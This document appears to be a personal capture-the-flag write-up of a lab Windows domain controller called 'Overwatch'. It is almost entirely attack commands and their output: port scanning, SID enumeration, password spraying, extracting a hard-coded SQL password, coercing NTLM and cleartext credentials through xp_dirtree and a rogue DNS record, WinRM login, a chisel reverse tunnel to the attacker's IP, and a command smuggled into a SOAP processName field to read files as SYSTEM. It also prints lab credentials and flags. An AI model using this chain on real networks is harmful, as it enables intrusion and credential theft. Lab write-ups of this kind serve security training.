## NMAP SCAN
```
nmap -sSCV -p- 10.129.203.198                              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-30 01:22 +0700
Stats: 0:04:00 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 01:26 (0:00:06 remaining)
Nmap scan report for 10.129.203.198
Host is up (0.078s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  tcpwrapped
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-29 12:55:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
|_ssl-date: 2026-04-29T12:57:29+00:00; -5h30m01s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-29T12:56:48+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.203.198:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.203.198:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
|_ssl-date: 2026-04-29T12:57:30+00:00; -5h30m04s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-29T12:53:01
|_Not valid after:  2056-04-29T12:53:01
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53527/tcp open  msrpc         Microsoft Windows RPC
60434/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60435/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-29T12:56:52
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: -5h30m01s, deviation: 1s, median: -5h30m01s
```

```
smbclient -L //10.129.203.198/ 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        software$       Disk      
        SYSVOL          Disk      Logon server share 
```
lets look for users..... 
```
impacket-lookupsid anonymous@10.129.203.198                 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.129.203.198
[*] StringBinding ncacn_np:10.129.203.198[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2797066498-1365161904-233915892
498: OVERWATCH\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: OVERWATCH\Administrator (SidTypeUser)
501: OVERWATCH\Guest (SidTypeUser)
502: OVERWATCH\krbtgt (SidTypeUser)
512: OVERWATCH\Domain Admins (SidTypeGroup)
513: OVERWATCH\Domain Users (SidTypeGroup)
514: OVERWATCH\Domain Guests (SidTypeGroup)
515: OVERWATCH\Domain Computers (SidTypeGroup)
516: OVERWATCH\Domain Controllers (SidTypeGroup)
517: OVERWATCH\Cert Publishers (SidTypeAlias)
518: OVERWATCH\Schema Admins (SidTypeGroup)
519: OVERWATCH\Enterprise Admins (SidTypeGroup)
520: OVERWATCH\Group Policy Creator Owners (SidTypeGroup)
521: OVERWATCH\Read-only Domain Controllers (SidTypeGroup)
522: OVERWATCH\Cloneable Domain Controllers (SidTypeGroup)
525: OVERWATCH\Protected Users (SidTypeGroup)
526: OVERWATCH\Key Admins (SidTypeGroup)
527: OVERWATCH\Enterprise Key Admins (SidTypeGroup)
553: OVERWATCH\RAS and IAS Servers (SidTypeAlias)
571: OVERWATCH\Allowed RODC Password Replication Group (SidTypeAlias)
572: OVERWATCH\Denied RODC Password Replication Group (SidTypeAlias)
1000: OVERWATCH\S200401$ (SidTypeUser)
1101: OVERWATCH\DnsAdmins (SidTypeAlias)
1102: OVERWATCH\DnsUpdateProxy (SidTypeGroup)
1103: OVERWATCH\SQLServer2005SQLBrowserUser$S200401 (SidTypeAlias)
1104: OVERWATCH\sqlsvc (SidTypeUser)
1105: OVERWATCH\sqlmgmt (SidTypeUser)
1106: OVERWATCH\SQL03$ (SidTypeUser)
1107: OVERWATCH\NB001$ (SidTypeUser)
1108: OVERWATCH\NB002$ (SidTypeUser)
1109: OVERWATCH\FILE01$ (SidTypeUser)
1110: OVERWATCH\S200400$ (SidTypeUser)
1111: OVERWATCH\employees (SidTypeGroup)
1112: OVERWATCH\Charlie.Moss (SidTypeUser)
1113: OVERWATCH\Tracy.Burns (SidTypeUser)
1114: OVERWATCH\Kathryn.Bryan (SidTypeUser)
1115: OVERWATCH\Rachael.Thomas (SidTypeUser)
1116: OVERWATCH\Aimee.Smith (SidTypeUser)
1117: OVERWATCH\Duncan.Freeman (SidTypeUser)
1118: OVERWATCH\John.Begum (SidTypeUser)
1119: OVERWATCH\Bernard.Hilton (SidTypeUser)
1120: OVERWATCH\Kim.Hargreaves (SidTypeUser)
1121: OVERWATCH\Douglas.Burrows (SidTypeUser)
1122: OVERWATCH\Carole.Murray (SidTypeUser)
1123: OVERWATCH\Olivia.Quinn (SidTypeUser)
1124: OVERWATCH\Trevor.Baker (SidTypeUser)
1125: OVERWATCH\Kenneth.Dennis (SidTypeUser)
1126: OVERWATCH\Jeremy.Marshall (SidTypeUser)
1127: OVERWATCH\Jodie.Jones (SidTypeUser)
1128: OVERWATCH\Thomas.Lee (SidTypeUser)
1129: OVERWATCH\Terence.Matthews (SidTypeUser)
1130: OVERWATCH\Colin.Roberts (SidTypeUser)
1131: OVERWATCH\Aaron.Robinson (SidTypeUser)
1132: OVERWATCH\Amanda.Jenkins (SidTypeUser)
1133: OVERWATCH\Debra.Arnold (SidTypeUser)
1134: OVERWATCH\Michelle.Willis (SidTypeUser)
1135: OVERWATCH\Kayleigh.Jones (SidTypeUser)
1136: OVERWATCH\Adam.Russell (SidTypeUser)
1137: OVERWATCH\Tracey.Kelly (SidTypeUser)
1138: OVERWATCH\Bethan.Dale (SidTypeUser)
1139: OVERWATCH\Mandy.Wood (SidTypeUser)
1140: OVERWATCH\Jenna.Phillips (SidTypeUser)
1141: OVERWATCH\Carole.Yates (SidTypeUser)
1142: OVERWATCH\Graham.Perry (SidTypeUser)
1143: OVERWATCH\Catherine.Griffiths (SidTypeUser)
1144: OVERWATCH\Shaun.Jackson (SidTypeUser)
1145: OVERWATCH\Bethan.Rogers (SidTypeUser)
1146: OVERWATCH\Ellie.Singh (SidTypeUser)
1147: OVERWATCH\Marie.Allan (SidTypeUser)
1148: OVERWATCH\Patrick.Holmes (SidTypeUser)
1149: OVERWATCH\Victor.Hopkins (SidTypeUser)
1150: OVERWATCH\Geraldine.Harper (SidTypeUser)
1151: OVERWATCH\George.Todd (SidTypeUser)
1152: OVERWATCH\Karl.Smith (SidTypeUser)
1153: OVERWATCH\Jacqueline.Norton (SidTypeUser)
1154: OVERWATCH\Frederick.Murray (SidTypeUser)
1155: OVERWATCH\Joe.Pearce (SidTypeUser)
1156: OVERWATCH\Paul.Collins (SidTypeUser)
1157: OVERWATCH\Damien.Edwards (SidTypeUser)
1158: OVERWATCH\Eileen.Phillips (SidTypeUser)
1159: OVERWATCH\Carl.Johnson (SidTypeUser)
1160: OVERWATCH\Kevin.Newton (SidTypeUser)
1161: OVERWATCH\Natalie.Higgins (SidTypeUser)
1162: OVERWATCH\Francis.Weston (SidTypeUser)
1163: OVERWATCH\Benjamin.Davison (SidTypeUser)
1164: OVERWATCH\Martin.Kemp (SidTypeUser)
1165: OVERWATCH\Angela.Jones (SidTypeUser)
1166: OVERWATCH\Gareth.Ahmed (SidTypeUser)
1167: OVERWATCH\Deborah.Morgan (SidTypeUser)
1168: OVERWATCH\Grace.Taylor (SidTypeUser)
1169: OVERWATCH\Roger.Hughes (SidTypeUser)
1170: OVERWATCH\Albert.Barrett (SidTypeUser)
1171: OVERWATCH\Grace.Curtis (SidTypeUser)
1172: OVERWATCH\Marilyn.Griffiths (SidTypeUser)
1173: OVERWATCH\Tracey.Barker (SidTypeUser)
1174: OVERWATCH\Suzanne.Hughes (SidTypeUser)
1175: OVERWATCH\Timothy.Jackson (SidTypeUser)
1176: OVERWATCH\Beverley.Thompson (SidTypeUser)
1177: OVERWATCH\Clare.Bartlett (SidTypeUser)
1178: OVERWATCH\Irene.Johnson (SidTypeUser)
1179: OVERWATCH\Bernard.Wood (SidTypeUser)
1180: OVERWATCH\Frank.McCarthy (SidTypeUser)
1181: OVERWATCH\Elaine.Page (SidTypeUser)
1182: OVERWATCH\Elaine.Walker (SidTypeUser)
1183: OVERWATCH\Mohammad.Hill (SidTypeUser)
1184: OVERWATCH\Glenn.Field (SidTypeUser)
1185: OVERWATCH\Deborah.Martin (SidTypeUser)
1186: OVERWATCH\Gail.Sullivan (SidTypeUser)
1187: OVERWATCH\Maureen.Kirby (SidTypeUser)
1188: OVERWATCH\Georgina.Chambers (SidTypeUser)
1189: OVERWATCH\Philip.Harris (SidTypeUser)
1190: OVERWATCH\Samantha.Scott (SidTypeUser)
1191: OVERWATCH\Ann.Hill (SidTypeUser)
1192: OVERWATCH\Chloe.Cox (SidTypeUser)
1193: OVERWATCH\Jamie.Gough (SidTypeUser)
1194: OVERWATCH\Frederick.Hussain (SidTypeUser)
1195: OVERWATCH\Dean.Hobbs (SidTypeUser)
1196: OVERWATCH\Danielle.Moore (SidTypeUser)
1197: OVERWATCH\Timothy.Smith (SidTypeUser)
1198: OVERWATCH\Declan.Stone (SidTypeUser)
1199: OVERWATCH\Jacob.Wilson (SidTypeUser)
1200: OVERWATCH\Gary.Elliott (SidTypeUser)
1201: OVERWATCH\Peter.Slater (SidTypeUser)
1202: OVERWATCH\Louise.Walton (SidTypeUser)
1203: OVERWATCH\Brett.Haynes (SidTypeUser)
1204: OVERWATCH\Elliot.Green (SidTypeUser)
1205: OVERWATCH\Wendy.Williams (SidTypeUser)
1206: OVERWATCH\Graham.Parker (SidTypeUser)
1207: OVERWATCH\Abdul.Stevens (SidTypeUser)
1208: OVERWATCH\Brett.Bailey (SidTypeUser)
1209: OVERWATCH\Benjamin.Harrison (SidTypeUser)
1210: OVERWATCH\Emily.Cooper (SidTypeUser)
1211: OVERWATCH\Roger.Spencer (SidTypeUser)

```

```
nxc smb 10.129.203.198 -u /home/kali/HTB\ BOXES/Overwatch/users.txt -p /home/kali/HTB\ BOXES/Overwatch/users.txt --continue-on-success | grep "+"

SMB                      10.129.203.198  445    S200401          [+] overwatch.htb\S200401:S200401 (Guest)
```
```
smbclient  //10.129.203.198/'software$' -U 'S200401' 
Password for [WORKGROUP\S200401]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DH        0  Sat May 17 08:27:07 2025
  ..                                DHS        0  Thu Jan  1 13:46:47 2026
  Monitoring                         DH        0  Sat May 17 08:32:43 2025

                7147007 blocks of size 4096. 2277764 blocks available
smb: \> cd Monitoring\
smb: \Monitoring\> ls
  .                                  DH        0  Sat May 17 08:32:43 2025
  ..                                 DH        0  Sat May 17 08:27:07 2025
  EntityFramework.dll                AH  4991352  Fri Apr 17 03:38:42 2020
  EntityFramework.SqlServer.dll      AH   591752  Fri Apr 17 03:38:56 2020
  EntityFramework.SqlServer.xml      AH   163193  Fri Apr 17 03:38:56 2020
  EntityFramework.xml                AH  3738289  Fri Apr 17 03:38:40 2020
  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 21:46:10 2017
  overwatch.exe                      AH     9728  Sat May 17 08:19:24 2025
  overwatch.exe.config               AH     2163  Sat May 17 08:02:30 2025
  overwatch.pdb                      AH    30208  Sat May 17 08:19:24 2025
  System.Data.SQLite.dll             AH   450232  Mon Sep 30 03:41:18 2024
  System.Data.SQLite.EF6.dll         AH   206520  Mon Sep 30 03:40:06 2024
  System.Data.SQLite.Linq.dll        AH   206520  Mon Sep 30 03:40:42 2024
  System.Data.SQLite.xml             AH  1245480  Sun Sep 29 01:48:00 2024
  System.Management.Automation.dll     AH   360448  Mon Jul 17 21:46:10 2017
  System.Management.Automation.xml     AH  7145771  Mon Jul 17 21:46:10 2017
  x64                                DH        0  Sat May 17 08:32:33 2025
  x86                                DH        0  Sat May 17 08:32:33 2025
```

used monodis for looking into overwatch.exe and found 
```
Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
```
sqlsvc:TI0LKcfHzZw1Vv

```
impacket-mssqlclient 'OVERWATCH/sqlsvc:TI0LKcfHzZw1Vv@10.129.203.198' -p 6520 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> enum_db
name        is_trustworthy_on   
---------   -----------------   
master                      0   
tempdb                      0   
model                       0   
msdb                        1   
overwatch                   0   
SQL (OVERWATCH\sqlsvc  guest@master)> USE msdb
ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'msdb'.
SQL (OVERWATCH\sqlsvc  guest@msdb)>
```

got into mssql sv
```
SQL (OVERWATCH\sqlsvc  guest@msdb)> EXEC master..xp_dirtree '\\10.10.14.53\anything', 1, 1;


[SMB] NTLMv2-SSP Client   : 10.129.203.198
[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$
[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:2d8e3093e01c4c6c:7BEFF7A7CF7C7A6542A1C3E25D561E60:010100000000000080BDB2E31FD8DC01930347F732671DD700000000020008004D0051005800490001001E00570049004E002D00530057004B003400330059005000480033004E004E0004003400570049004E002D00530057004B003400330059005000480033004E004E002E004D005100580049002E004C004F00430041004C00030014004D005100580049002E004C004F00430041004C00050014004D005100580049002E004C004F00430041004C000700080080BDB2E31FD8DC0106000400020000000800300030000000000000000000000000300000CC5799C61174190112C4B37BA9F97BBD72A9EB26A1ED453ACCAF2E197A72BCA90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350033000000000000000000                                                                                                                                  
[+] Exiting...

```

got hash on responder.... but this is a machine hash and impossible to crack
lets try putting a fake instead of our ip so it sends more hashes ???
```
EXEC sp_linkedservers;
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
```
SQL07 good 
```
dnstool  -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r 'SQL07' -a add -d 10.10.14.53 10.129.203.198
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```
it was empty so we put ourselfs there...
```
RAN THIS FIRST 
SQL (OVERWATCH\sqlsvc  guest@msdb)> SELECT * FROM OPENQUERY("SQL07", 'SELECT 1');
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.

AND GOT PASS FOR A USER IN RESPONDER
[MSSQL] Cleartext Client   : 10.129.203.198
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx

```
sqlmgmt:bIhBbzMMnB82yx

![[Pasted image 20260429203753.png]]
since sqlmgmt is part of remote management we can winrm and get user flag...
```
evil-winrm -i 10.129.203.198 -u sqlmgmt -p bIhBbzMMnB82yx        
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ..
*Evil-WinRM* PS C:\Users\sqlmgmt> cd Desktop
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
65aa8f40fd4c8e65e9ab1e6ff2f133d7

```

now lets do port forwarding using chisel and access the webpage.... 

start the client
```
chisel server -p 9000 --reverse --host 10.10.14.53         
2026/04/30 16:34:54 server: Reverse tunnelling enabled
2026/04/30 16:34:54 server: Fingerprint HBKDL47i9yneKkYDoMKa8SQDQg0Twg1HWW579RJTyhM=
2026/04/30 16:34:54 server: Listening on http://10.10.14.53:9000
2026/04/30 16:36:05 server: session#1: Client version (1.9.1) differs from server version (1.11.5-0kali1)
2026/04/30 16:36:05 server: session#1: tun: proxy#R:8000=>8000: Listening

```

upload and run the agent on windows
```
*Evil-WinRM* PS C:\Users\sqlmgmt\Downloads> upload chisel.exe
                                        
Info: Uploading /home/kali/chisel.exe to C:\Users\sqlmgmt\Downloads\chisel.exe
                                        
Data: 12008104 bytes of 12008104 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\sqlmgmt\Downloads> ./chisel.exe client 10.10.14.53:9000 R:8000:127.0.0.1:8000
chisel.exe : 2026/04/29 21:06:06 client: Connecting to ws://10.10.14.53:9000
    + CategoryInfo          : NotSpecified: (2026/04/29 21:0...0.10.14.53:9000:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/04/29 21:06:06 client: Connected (Latency 98.8853ms)
```

lets use burp to intercetp.. 
in repeater sent the req to get root flag as we saw in the code files earlier we got from smb that we can run a req as NT/SYSTEM so we can type the  flag 
```
POST /MonitorService HTTP/1.1
Host: overwatch.htb:8000
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/IMonitoringService/KillProcess"
Connection: close
Content-Length: 261

<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad; type C:\Users\Administrator\Desktop\root.txt</processName>
    </KillProcess>
  </s:Body>
</s:Envelope>

```

![[Pasted image 20260430095253.png]]
and we have the root flag..... remember the soapaction should be correct otherwise it wont work 